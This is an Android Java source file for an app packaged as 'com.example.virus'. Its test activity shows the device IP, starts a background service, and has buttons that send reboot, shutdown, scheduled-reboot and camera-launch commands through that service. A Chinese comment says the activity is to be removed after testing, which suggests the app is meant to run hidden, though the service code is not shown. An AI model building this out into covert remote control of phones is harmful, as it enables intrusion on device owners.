package com.example.virus;

import java.io.IOException;

import com.example.virus.BackgroudService.BackgroundBinder;
import com.example.virus.Util.CommandType;

import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.IBinder;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

//测试用，测试成功后请务必删除此activity
public class MainActivity extends Activity {

	private TextView outDisplay;
	private Button shutdownButton;
	private Button rebootButton;
	private Button alarmRebootButton;
	private Button launchCameraButton;
    private String mIpAddress;  
    
    private BackgroundBinder mServiceBinder;
    
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		outDisplay = (TextView) findViewById(R.id.iptext);
		rebootButton = (Button) findViewById(R.id.reboot_btn);
		rebootButton.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				mServiceBinder.executeCommand(CommandType.REBOOT);
			}
		});
		shutdownButton = (Button) findViewById(R.id.shutdown_btn);
		shutdownButton.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				mServiceBinder.executeCommand(CommandType.SHUTDOWN);
			}
		});
		alarmRebootButton = (Button) findViewById(R.id.alarm_reboot_btn);
		alarmRebootButton.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				mServiceBinder.executeCommand(CommandType.ALARM_REBOOT);
			}
		});
		Button launchCameraButton = (Button) findViewById(R.id.launch_camera_btn);
		launchCameraButton.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				mServiceBinder.executeCommand(CommandType.LAUNCH_CAMERA);
			}
		});
		mIpAddress = Util.getHostIp(this);
		outDisplay.setText("IP: " + mIpAddress);
        Intent intent = new Intent(this, BackgroudService.class);  
        startService(intent); 	
		this.bindService(intent, mConnection, BIND_AUTO_CREATE);
	}
    
    @Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}   

    private ServiceConnection mConnection = new ServiceConnection() {
		
		@Override
		public void onServiceDisconnected(ComponentName name) {
			mServiceBinder = null;
		}
		
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mServiceBinder = (BackgroundBinder) service;
		}
	};
}
